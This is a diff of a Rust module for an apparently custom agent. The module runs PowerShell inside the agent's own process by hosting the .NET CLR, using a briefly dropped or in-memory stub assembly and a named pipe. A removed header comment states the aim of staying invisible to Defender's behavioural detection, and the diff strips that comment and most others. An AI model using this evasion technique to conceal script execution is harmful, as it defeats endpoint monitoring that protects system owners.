@@ -1,31 +1,18 @@
-//! In-process PowerShell（powershell-inline）：在 agent 进程内托管 .NET CLR 4，
-//! 从 GAC 加载 System.Management.Automation 执行脚本 —— 不创建 powershell.exe
-//! 进程、不写系统 DLL 内存，对 Defender 行为检测不可见。
 //!
-//! 宿主链路（Win10 ~ Win11 24H2 验证）：
 //!   mscoree!CorBindToRuntimeEx("v4.0.30319", ..., IID_ICLRRuntimeHost)
 //!   → ICLRRuntimeHost::Start()
 //!   → ExecuteInDefaultAppDomain(psinline_stub.dll, "PsInline.Stub", "Run", args)
 //!
-//! Stub 程序集（net48，构建时用本机 csc.exe 编译，字节内嵌于模块）负责：
-//!   PowerShell.Create() + RunspaceFactory → 执行脚本 → JSON 结果经命名管道回传。
-//! Stub 以瞬时临时文件方式执行（写入随机名 → 执行 → 立即删除），文件本身是
-//! 无恶意内容的转发器；后续可换 _AppDomain 纯内存加载（Win11 24H2 上
-//! _AppDomain 的 IDispatch 不可靠，需在目标版本上单独攻坚）。
 //!
-//! 安全边界：CLR 宿主崩溃会带走 agent 进程，因此所有托管调用串行化执行；
-//! 脚本超时由 stub 内 Task.Wait(timeout) 控制，超时后 ps.Stop()。
 
 #![allow(non_snake_case)]
 #![allow(clippy::upper_case_acronyms)]
-#![allow(dead_code)] // COM vtable 结构字段按接口顺序声明，未用字段保持布局完整
+#![allow(dead_code)]
 
 use std::ffi::c_void;
 use std::ptr;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::{Arc, Mutex, OnceLock};
-
-// ── 嵌入的 stub 程序集（构建时由 build.rs 编译）────────────────────────
 
 #[cfg(target_os = "windows")]
 const STUB_DLL: &[u8] = include_bytes!(concat!(
@@ -81,8 +68,6 @@ const IID_IDispatch: Guid = Guid::new(
     0x0000,
     [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
 );
-
-// ── COM vtable（ICorRuntimeHost 老接口 + ICLRRuntimeHost 新接口）────────
 
 #[repr(C)]
 struct ICorRuntimeHostVtbl {
@@ -166,8 +151,6 @@ struct ICLRRuntimeHostVtbl {
     get_clr_manager: unsafe extern "system" fn(*mut c_void, *const Guid, *mut *mut c_void) -> i32,
 }
 
-// ── IDispatch 工具（调试/备用路径）────────────────────────────────────
-
 #[repr(C)]
 struct IDispatchVtbl {
     query_interface: unsafe extern "system" fn(*mut c_void, *const Guid, *mut *mut c_void) -> i32,
@@ -198,7 +181,6 @@ struct IDispatchVtbl {
 
 const IID_NULL: Guid = Guid::new(0, 0, 0, [0; 8]);
 
-/// 按名字解析 DISPID；失败返回 None。
 #[cfg(target_os = "windows")]
 unsafe fn get_dispid(obj: *mut c_void, name: &str) -> Option<i32> {
     let vtbl = &*(*(obj as *const *const IDispatchVtbl));
@@ -221,8 +203,6 @@ unsafe fn get_dispid(obj: *mut c_void, name: &str) -> Option<i32> {
 
 // ── kernel32 FFI ───────────────────────────────────────────────────────
 
-// Windows 专用：Linux/macOS 交叉编译不得链接 kernel32（此前漏掉门控导致
-// powershell-module 的 .so 链接期找不到 kernel32/oleaut32，全部云模块部署失败）。
 #[cfg(target_os = "windows")]
 #[link(name = "kernel32")]
 extern "system" {
@@ -269,21 +249,14 @@ const ERROR_BROKEN_PIPE: u32 = 109;
 const ERROR_NO_DATA: u32 = 232;
 const ERROR_OPERATION_ABORTED: u32 = 995;
 
-// ── CLR 宿主状态（进程级单例）─────────────────────────────────────────
-
 #[cfg(target_os = "windows")]
 struct ClrHost {
     host: *mut c_void,
-    /// true = ICLRRuntimeHost（ExecuteInDefaultAppDomain 入口）；
-    /// false = ICorRuntimeHost 老接口（GetDefaultDomain → IDispatch 路径）。
     use_new: bool,
-    /// 默认 AppDomain 的 IDispatch（老接口路径用）。
     domain: *mut c_void,
-    /// 串行化所有托管调用：CLR 执行必须互斥，避免并发脚本互相污染。
     gate: Mutex<()>,
 }
 
-// COM 接口指针在本进程中只被同步访问，跨线程共享是安全的。
 #[cfg(target_os = "windows")]
 unsafe impl Send for ClrHost {}
 #[cfg(target_os = "windows")]
@@ -319,8 +292,6 @@ unsafe fn init_clr_host() -> Result<ClrHost, String> {
     ) -> i32;
     let bind: CorBindFn = std::mem::transmute(bind_ptr);
 
-    // 绑定老接口 ICorRuntimeHost（24H2 上 CLRCreateInstance/ICLRRuntimeHost
-    // 均不可用，老接口是唯一入口）。
     let mut host: *mut c_void = ptr::null_mut();
     let hr = bind(
         wide("v4.0.30319").as_ptr(),
@@ -330,13 +301,10 @@ unsafe fn init_clr_host() -> Result<ClrHost, String> {
         &IID_ICorRuntimeHost,
         &mut host,
     );
-    // S_OK / S_FALSE（已绑定）都视为成功
     if (hr != 0 && hr != 1) || host.is_null() {
         return Err(format!("CorBindToRuntimeEx failed: 0x{:08X}", hr as u32));
     }
 
-    // 尝试升级到新接口 ICLRRuntimeHost（ExecuteInDefaultAppDomain 入口）；
-    // 失败则回退老接口路径（GetDefaultDomain → IDispatch）。
     let legacy_vtbl = &*(*(host as *const *const ICorRuntimeHostVtbl));
     let mut new_host: *mut c_void = ptr::null_mut();
     let qhr = (legacy_vtbl.query_interface)(host, &IID_ICLRRuntimeHost, &mut new_host);
@@ -346,9 +314,6 @@ unsafe fn init_clr_host() -> Result<ClrHost, String> {
         (host, false)
     };
 
-    // 按实际接口布局调用 Start / GetDefaultDomain。
-    // default domain 在新启动的 CLR 上可能未完全初始化导致实例化挂起，
-    // 因此老接口路径优先新建专用 AppDomain（创建完即可用）。
     let mut domain: *mut c_void = ptr::null_mut();
     if use_new {
         let vtbl = &*(*(runtime_host as *const *const ICLRRuntimeHostVtbl));
@@ -376,12 +341,10 @@ unsafe fn init_clr_host() -> Result<ClrHost, String> {
             &mut domain,
         );
         if cdr != 0 || domain.is_null() {
-            // 回退 default domain
             let _ = (vtbl.get_default_domain)(runtime_host, &mut domain);
         }
     }
 
-    // 备用路径：获取默认 AppDomain 的 IDispatch（老接口回退路径用）。
     let mut dispatch: *mut c_void = ptr::null_mut();
     if !domain.is_null() {
         let dhr = ((*(*(domain as *const *const IDispatchVtbl))).query_interface)(
@@ -401,7 +364,6 @@ unsafe fn init_clr_host() -> Result<ClrHost, String> {
         gate: Mutex::new(()),
     })
 }
-// ── 命名管道回传通道（Windows 专用）───────────────────────────────────
 
 #[cfg(target_os = "windows")]
 struct PipeReadResult {
@@ -409,7 +371,6 @@ struct PipeReadResult {
     timeout: bool,
 }
 
-/// 主线程先创建管道（stub 执行前必须已存在），返回句柄。
 #[cfg(target_os = "windows")]
 unsafe fn create_pipe(pipe_name: &str) -> *mut c_void {
     let name = wide(&format!(r"\\.\pipe\{}", pipe_name));
@@ -425,7 +386,6 @@ unsafe fn create_pipe(pipe_name: &str) -> *mut c_void {
     )
 }
 
-/// Win32 句柄是 `usize` 值，跨线程移动是安全的。
 #[cfg(target_os = "windows")]
 struct PipeHandle(*mut c_void);
 #[cfg(target_os = "windows")]
@@ -433,7 +393,6 @@ unsafe impl Send for PipeHandle {}
 #[cfg(target_os = "windows")]
 unsafe impl Sync for PipeHandle {}
 
-/// 管道读取线程：连接 → 轮询读取直到 EOF 或主线程关闭句柄。
 #[cfg(target_os = "windows")]
 fn pipe_reader(
     handle: PipeHandle,
@@ -500,9 +459,6 @@ fn pipe_reader(
     }
 }
 
-// ── 入口 ───────────────────────────────────────────────────────────────
-
-/// 在 agent 进程内执行 PowerShell 脚本，返回结果字符串（JSON 或错误描述）。
 pub fn execute_inline(script: &str, timeout_secs: u64) -> String {
     #[cfg(target_os = "windows")]
     {
@@ -511,7 +467,6 @@ pub fn execute_inline(script: &str, timeout_secs: u64) -> String {
             Err(e) => return format!(r#"{{"success":false,"error":"{e}"}}"#),
         };
 
-        // 串行化托管调用
         let _gate = match host.gate.lock() {
             Ok(g) => g,
             Err(e) => return format!(r#"{{"success":false,"error":"clr gate poisoned: {e}"}}"#),
@@ -520,7 +475,6 @@ pub fn execute_inline(script: &str, timeout_secs: u64) -> String {
         let pipe_name = format!("libra_ps_{:016x}", rand_hex());
         let script_b64 = base64_encode(script.as_bytes());
 
-        // 1) 先建管道（stub 执行时管道必须已存在，否则连接失败）
         let handle = unsafe { create_pipe(&pipe_name) };
         if handle.is_null() || handle == -1isize as *mut c_void {
             return r#"{"success":false,"error":"CreateNamedPipe failed"}"#.to_string();
@@ -535,7 +489,6 @@ pub fn execute_inline(script: &str, timeout_secs: u64) -> String {
             std::thread::spawn(move || pipe_reader(pipe_handle, done, result))
         };
 
-        // 2) 执行 stub
         let args = format!(
             "{}|{}|{}",
             pipe_name,
@@ -552,15 +505,13 @@ pub fn execute_inline(script: &str, timeout_secs: u64) -> String {
             }
         };
 
-        // 执行失败（stub 未运行）：管道永远不会被连接，直接收尾返回。
         if let Err(e) = exec_result {
-            unsafe { CloseHandle(handle) }; // 解除 reader 阻塞
+            unsafe { CloseHandle(handle) };
             let _ = reader.join();
             return format!(r#"{{"success":false,"error":"{e}"}}"#);
         }
         let exit_code = exec_result.unwrap_or(-1);
 
-        // 3) 等待管道结果（总超时 = 脚本超时 + 30s CLR 启动容忍）
         let deadline_ms = (timeout_secs.max(1) * 1000) + 30_000;
         let start = std::time::Instant::now();
         let mut timed_out = false;
@@ -570,7 +521,7 @@ pub fn execute_inline(script: &str, timeout_secs: u64) -> String {
             }
             if start.elapsed().as_millis() as u64 >= deadline_ms {
                 timed_out = true;
-                unsafe { CloseHandle(handle) }; // 解除 reader 阻塞
+                unsafe { CloseHandle(handle) };
                 break;
             }
             std::thread::sleep(std::time::Duration::from_millis(20));
@@ -603,7 +554,6 @@ pub fn execute_inline(script: &str, timeout_secs: u64) -> String {
     }
 }
 
-/// 把内嵌 stub 字节写入临时文件（随机名），返回路径。调用方执行后立即删除。
 #[cfg(target_os = "windows")]
 unsafe fn write_stub_temp() -> Option<String> {
     let mut tmp = [0u16; 260];
@@ -619,7 +569,6 @@ unsafe fn write_stub_temp() -> Option<String> {
     Some(path)
 }
 
-/// ICLRRuntimeHost 路径：stub 瞬时落盘 → ExecuteInDefaultAppDomain → 删除。
 #[cfg(target_os = "windows")]
 unsafe fn execute_via_new_interface(host: *mut c_void, args: &str) -> Result<i32, String> {
     let stub_path = write_stub_temp().ok_or("write stub temp failed")?;
@@ -643,8 +592,6 @@ unsafe fn execute_via_new_interface(host: *mut c_void, args: &str) -> Result<i32
     Ok(exit_code as i32)
 }
 
-// ── 老接口路径：_AppDomain IDispatch 纯内存加载（Windows 专用）────────
-
 #[cfg(target_os = "windows")]
 #[repr(C)]
 union VariantData {
@@ -652,8 +599,6 @@ union VariantData {
     ptr: *mut c_void,
     lval: i32,
     boolval: i16,
-    /// DECIMAL 占 16 字节；x64 上 VARIANT 的 union 必须是 16 字节，
-    /// 否则多参数数组的第二个元素偏移错误。
     decimal: [u8; 16],
 }
 
@@ -724,7 +669,6 @@ extern "system" {
     fn VariantClear(v: *mut Variant) -> i32;
 }
 
-/// Invoke 一个方法（参数在 rgvarg 中，反序），返回结果 VARIANT。
 #[cfg(target_os = "windows")]
 unsafe fn invoke_method(
     obj: *mut c_void,
@@ -763,11 +707,8 @@ unsafe fn invoke_method(
     Ok(result)
 }
 
-/// 老接口路径：_AppDomain::Load_2(byte[]) 纯内存加载 stub →
-/// CreateInstanceAndUnwrap → IDispatch Invoke("Run")。
 #[cfg(target_os = "windows")]
 unsafe fn execute_via_legacy_idispatch(domain: *mut c_void, args: &str) -> Result<i32, String> {
-    // 1) Load_2(byte[]) 内存加载
     let sa = SafeArrayCreateVector(VT_UI1, 0, STUB_DLL.len() as u32);
     if sa.is_null() {
         return Err("SafeArrayCreateVector failed".into());
@@ -790,7 +731,6 @@ unsafe fn execute_via_legacy_idispatch(domain: *mut c_void, args: &str) -> Resul
         },
     };
     let mut load_dispid: Option<i32> = None;
-    // 实测：Load_3 是 byte[] 单参重载（Load_2 在 .NET 4.8 上是别的签名）
     for name in ["Load_3", "Load", "Load_2"] {
         if let Some(d) = get_dispid(domain, name) {
             load_dispid = Some(d);
@@ -799,11 +739,8 @@ unsafe fn execute_via_legacy_idispatch(domain: *mut c_void, args: &str) -> Resul
     }
     let load_dispid = load_dispid.ok_or("Load(byte[]) DISPID not found")?;
     let mut assembly = invoke_method(domain, load_dispid, std::slice::from_mut(&mut load_arg))?;
-    // VariantClear 会释放 SAFEARRAY，切勿再手动 SafeArrayDestroy（双重释放）
     VariantClear(&mut load_arg);
 
-    // 2) 用 _Assembly::CreateInstance("PsInline.Stub") 创建实例
-    //    （绕开 AppDomain::CreateInstance* —— 后者在新启动 CLR 上死锁）
     let assembly_ptr = match assembly.vt {
         VT_DISPATCH | VT_UNKNOWN => assembly.data.ptr,
         _ => {
@@ -855,7 +792,6 @@ unsafe fn execute_via_legacy_idispatch(domain: *mut c_void, args: &str) -> Resul
     VariantClear(&mut type_name);
     VariantClear(&mut assembly);
 
-    // 3) 实例 QI IDispatch → Invoke("Run", [args])
     let instance_ptr = match instance.vt {
         VT_DISPATCH | VT_UNKNOWN => instance.data.ptr,
         _ => {
@@ -909,8 +845,6 @@ unsafe fn execute_via_legacy_idispatch(domain: *mut c_void, args: &str) -> Resul
     Ok(exit_code)
 }
 
-// ── 小工具 ─────────────────────────────────────────────────────────────
-
 fn wide(s: &str) -> Vec<u16> {
     s.encode_utf16().chain(std::iter::once(0)).collect()
 }
@@ -921,7 +855,6 @@ fn rand_hex() -> u64 {
         .duration_since(UNIX_EPOCH)
         .unwrap_or_default();
     let nanos = t.as_nanos() as u64;
-    // 混合 PID 与时间，避免命名冲突
     let pid = std::process::id() as u64;
     nanos.rotate_left(16) ^ pid.wrapping_mul(0x9E3779B97F4A7C15)
 }
